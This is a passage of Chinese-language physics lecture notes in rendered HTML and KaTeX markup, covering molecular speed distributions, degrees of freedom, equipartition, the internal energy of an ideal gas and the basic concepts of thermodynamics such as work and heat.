class="vlist-r"><span class="vlist" style="height:1.2487em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8723em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">RT</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span style="top:-3.2087em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.88em;"><svg xmlns="http://www.w3.org/2000/svg" width='400em' height='1.88em' viewBox='0 0 400000 1944' preserveAspectRatio='xMinYMin slice'><path d='M983 90l0 -0c4,-6.7,10,-10,18,-10 H400000v40H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5c53.7,-170.3,84.5,-266.8,92.5,-289.5zM1001 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5913em;"><span></span></span></span></span></span></span></span></span></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648643805606-547b913e-5190-46b2-b440-78feff9010ae.png#clientId=u99aaaeaf-45d2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=374&amp;id=u7069784a&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=468&amp;originWidth=922&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=19422&amp;status=done&amp;style=none&amp;taskId=uaa360364-e2ab-4a52-bbb4-647f30b88e7&amp;title=&amp;width=737.6" alt="图片.png"></p><h3 id="讨论-2">讨论</h3><ol><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">v_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>与温度 T 的关系</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648643091895-6dff855f-faba-4e74-8416-65e171afbf82.png#clientId=ue757bff5-7f1c-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=350&amp;id=ubc3c0e48&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=437&amp;originWidth=903&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=23175&amp;status=done&amp;style=none&amp;taskId=u45ffed9b-b8dd-4330-a2ab-c4f6c6887fe&amp;title=&amp;width=722.4" alt="图片.png"></p><ol start="2"><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">v_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 与 M 的关系</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648643156324-4d940c23-feb8-4636-8de1-d6019aeb8315.png#clientId=u99aaaeaf-45d2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=396&amp;id=u0fc4a3ba&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=495&amp;originWidth=913&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=26644&amp;status=done&amp;style=none&amp;taskId=u2ec88840-34c8-4015-8eb4-6f55fe063c4&amp;title=&amp;width=730.4" alt="图片.png"></p><h2 id="理想气体内能">理想气体内能</h2><h3 id="分子自由度">分子自由度</h3><ol><li>自由度：描写物体在空间位置所需的独立坐标数。</li><li>气体分子的自由度</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648643938390-326875eb-bd0f-49f6-80cf-073f4e3a9bfc.png#clientId=u99aaaeaf-45d2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=554&amp;id=u1c11f7f7&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=693&amp;originWidth=906&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=49973&amp;status=done&amp;style=none&amp;taskId=u250d8281-075e-425e-852e-0482b3a4b3d&amp;title=&amp;width=724.8" alt="图片.png"></p><h3 id="理想气体压强-温度">理想气体压强 温度</h3><ol><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo>=</mo><mi>n</mi><mi>k</mi><mi>T</mi><mo>=</mo><mfrac><mn>2</mn><mn>3</mn></mfrac><mi>n</mi><msub><mover accent="true"><mi>ε</mi><mo>ˉ</mo></mover><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">P=nkT=\frac{2}{3}n \bar ε_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">nk</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathnormal">n</span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">ε</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.1667em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li><li>平均平动动能 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mover accent="true"><mi>ε</mi><mo>ˉ</mo></mover><mi>k</mi></msub><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mi>m</mi><msup><mover accent="true"><mi>v</mi><mo>ˉ</mo></mover><mn>2</mn></msup><mo>=</mo><mfrac><mn>3</mn><mn>2</mn></mfrac><mi>k</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">\bar ε_k =\frac{1}{2}m \bar v^2=\frac{3}{2}kT</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7178em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">ε</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.1667em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathnormal">m</span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.2222em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> 其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mover accent="true"><mi>v</mi><mo>ˉ</mo></mover><mn>2</mn></msup><mo>=</mo><mfrac><mrow><mn>3</mn><mi>k</mi><mi>T</mi></mrow><mi>m</mi></mfrac></mrow><annotation encoding="application/x-tex">\bar v^2= \frac{3kT}{m}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.2222em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2251em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></li></ol><h3 id="能量均分定理">能量均分定理</h3><p>气体分子的每个自由度平均动能都相等，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>ε</mi><mo>ˉ</mo></mover><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mi>k</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">\bar ε =\frac{1}{2}kT</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5678em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">ε</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.1667em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span><br>分子有 i 个自由度，平均总动能为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>ε</mi><mo>ˉ</mo></mover><mo>=</mo><mfrac><mi>i</mi><mn>2</mn></mfrac><mi>k</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">\bar ε =\frac{i}{2}kT</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5678em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">ε</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.1667em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2007em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8557em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></p><h3 id="气体的内能">气体的内能</h3><ol><li>一个分子的能量为: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>i</mi><mn>2</mn></mfrac><mi>k</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">\frac{i}{2}kT</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2007em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8557em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></li><li>1mol 气体分子的能量为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>i</mi><mn>2</mn></mfrac><msub><mi>N</mi><mi>A</mi></msub><mi>k</mi><mi>T</mi><mo>=</mo><mfrac><mi>i</mi><mn>2</mn></mfrac><mi>R</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">\frac{i}{2}N_AkT=\frac{i}{2}RT</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2007em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8557em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2007em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8557em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathnormal" style="margin-right:0.13889em;">RT</span></span></span></span></li><li>m 千克气体的能量为： <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>=</mo><mfrac><mrow><mi>m</mi><mi>i</mi></mrow><mrow><mi>M</mi><mn>2</mn></mrow></mfrac><mi>R</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">E=\frac{mi}{M2}RT</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2007em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8557em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">mi</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathnormal" style="margin-right:0.13889em;">RT</span></span></span></span></li></ol><h1>第四章热力学</h1><h2 id="基本概念-2">基本概念</h2><h3 id="准静态过程">准静态过程</h3><p>开放系统 ：与外界有物质交换和能量交换<br>封闭系统 ：与外界有能量交换无物质交换<br>孤立系统： 与外界无物质交换无能量交换<br>准静态过程：从一个平衡态到另一平衡态所经过的每一中间状态均可近似当作平衡态的过程 。</p><h3 id="功（过程量）">功（过程量）</h3><p>功是能量传递和转换的量度，它引起系统热运动状态的变化 。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648646151102-ddea0dbd-9c4e-4723-9e5e-393923fd4382.png#clientId=u99aaaeaf-45d2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=262&amp;id=ufd8e41d8&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=328&amp;originWidth=940&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=20276&amp;status=done&amp;style=none&amp;taskId=u84218684-b339-4e19-95b8-c2bac87c41c&amp;title=&amp;width=752" alt="图片.png"></p><h3 id="热量（过程量）">热量（过程量）</h3><p>通过传热方式传递能量的量度，系统和外界之间存在温差而发生的能量传递 。<br>热量：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>=</mo><mi>c</mi><mi>m</mi><mo stretchy="false">(</mo><msub><mi>T</mi><mn>2</mn></msub><mo>−</mo><msub><mi>T</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Q=cm(T_2-T_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">m</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><br><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648648318637-e6e1df92-61e8-4109-b620-57fdd7730f7d.png#clientId=u99aaaeaf-45d2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=211&amp;id=ufb42b115&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=264&amp;originWidth=857&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=17771&amp;status=done&amp;style=none&amp;taskId=u9944802e-9f73-4e09-b98f-04d1d45f992&amp;title=&amp;width=685.6" alt="图片.png"></p><p>等容摩尔热容<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mrow><mi>V</mi><mo separator="true">,</mo><mi>μ</mi></mrow></msub></mrow><annotation encoding="application/x-tex">C_{V, μ}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span 